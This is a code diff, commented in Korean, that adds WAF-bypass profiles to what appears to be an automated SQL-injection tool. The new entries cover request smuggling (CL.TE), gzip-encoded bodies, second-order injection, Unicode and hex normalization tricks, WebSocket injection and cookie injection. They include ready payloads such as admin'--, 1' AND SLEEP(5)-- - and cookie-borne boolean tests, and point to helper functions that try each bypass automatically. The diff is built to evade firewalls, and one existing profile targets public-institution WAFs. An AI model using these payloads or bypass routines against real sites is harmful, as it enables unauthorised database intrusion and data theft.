@@ -425,6 +425,90 @@ GLOBAL_WAF_PROFILES: dict[str, dict] = {
         "notes": "공공기관 표준 WAF — 400 응답으로 SQL 키워드 차단. 헤더 인젝션이 가장 효과적",
     },
 
+    # ── HTTP Request Smuggling CL.TE ─────────────────────────────
+    "request_smuggling": {
+        "vendor": "HTTP Request Smuggling (CL.TE)",
+        "detection": [],
+        "bypass_strategy": [
+            "CL.TE: Content-Length=0 + Transfer-Encoding: chunked",
+            "WAF는 Content-Length=0 기준으로 빈 바디 허용",
+            "백엔드는 Transfer-Encoding으로 실제 chunked body 처리",
+            "sqli_request_smuggling(url, param, true_payload, false_payload) 호출",
+        ],
+        "tampers": [],
+        "notes": "Boolean/헤더/프로토콜 모두 실패 후 최후 수단. 서버 인프라 구조 파악 필요",
+    },
+
+    # ── gzip 압축 인코딩 ──────────────────────────────────────────
+    "gzip_encoding": {
+        "vendor": "Content-Encoding: gzip Request Body",
+        "detection": [],
+        "bypass_strategy": [
+            "Content-Encoding: gzip + gzip 압축된 요청 바디",
+            "WAF가 압축 해제 없이 통과시키면 백엔드에서 SQL 실행",
+            "_sqli_run_gzip(url, param, payload) 함수 사용",
+        ],
+        "tampers": [],
+        "notes": "Python requests 라이브러리 필요. curl 불가.",
+    },
+
+    # ── Second-order SQLi ─────────────────────────────────────────
+    "second_order": {
+        "vendor": "Second-order (Stored) SQL Injection",
+        "detection": [],
+        "bypass_strategy": [
+            "저장 폼: username=admin'-- (WAF 통과, DB에 그대로 저장)",
+            "조회 시: SELECT * FROM users WHERE name='admin'-- 실행",
+            "이중 인코딩 저장: admin%2527-- → URL디코딩 → admin'-- → 저장",
+            "_inject_second_order_notice 자동 교정기가 저장 패턴 감지 시 안내",
+        ],
+        "tampers": [],
+        "notes": "WAF는 입력 시점만 검사 → DB에 저장된 값이 실행될 때 WAF 우회 완성",
+    },
+
+    # ── 유니코드 정규화 ───────────────────────────────────────────
+    "unicode_normalization": {
+        "vendor": "Unicode Normalization Bypass",
+        "detection": [],
+        "bypass_strategy": [
+            "전각문자: ＡＮＤ, ＯＲ, ＳＥＬＥＣＴ → 일부 DBMS가 정규화",
+            "키릴 문자: Ѕ (U+0405) → S로 정규화되는 시스템",
+            "MySQL 과학적 표기법: 1e0=1e0 → TRUE",
+            "HEX 값: AND 0x31=0x31 → AND 1=1",
+            "_waf_bypass_variants variant 13-16번으로 자동 시도",
+        ],
+        "tampers": [],
+        "notes": "DBMS와 앱의 문자 정규화 레벨에 의존. MySQL 5.7+에서 효과적",
+    },
+
+    # ── WebSocket 인젝션 ──────────────────────────────────────────
+    "websocket_sqli": {
+        "vendor": "WebSocket SQL/Command Injection",
+        "detection": ["upgrade: websocket", "101 switching protocols", "ws://", "wss://"],
+        "bypass_strategy": [
+            "WebSocket 메시지에 SQLi 페이로드 삽입",
+            "WAF가 WebSocket 트래픽 미검사 → HTTP 차단 우회",
+            "JSON 메시지: {\"query\": \"1' AND SLEEP(5)-- -\"}",
+            "_inject_websocket_hint 자동 교정기가 WS 감지 시 안내",
+        ],
+        "tampers": [],
+        "notes": "websocket-client Python 라이브러리 필요",
+    },
+
+    # ── 쿠키 인젝션 ───────────────────────────────────────────────
+    "cookie_injection": {
+        "vendor": "Cookie-based SQL Injection",
+        "detection": [],
+        "bypass_strategy": [
+            "쿠키 값에 페이로드: Cookie: session=1' AND 1=1-- -",
+            "URL 파라미터 WAF 차단돼도 쿠키는 통과하는 경우",
+            "_sqli_make_cookie_cmd(url, param, payload) 함수 사용",
+            "sqli_boolean STAGE 5a에서 자동 시도",
+        ],
+        "tampers": [],
+        "notes": "세션/추적 쿠키를 DB 조회에 사용하는 앱에서 효과적",
+    },
+
     # ── HPP / JSON / Multipart / HTTP2 / Chunked 프로토콜 우회 ──
     "protocol_bypass": {
         "vendor": "Protocol-Level WAF Bypass (범용)",
